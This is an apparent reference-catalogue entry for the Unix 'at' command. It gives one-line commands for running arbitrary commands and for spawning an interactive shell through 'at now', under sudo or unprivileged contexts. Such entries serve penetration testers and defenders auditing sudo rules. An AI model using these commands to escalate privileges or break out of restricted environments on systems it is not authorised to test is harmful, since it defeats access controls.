title: at
html:
at

Command Execution

Context: sudo, unprivileged

echo /path/to/command | at now

Shell

Context: sudo, unprivileged

echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
excerpt: at Command Execution Context: sudo, unprivileged echo /path/to/command | at now Shell Context: sudo, unprivileged echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
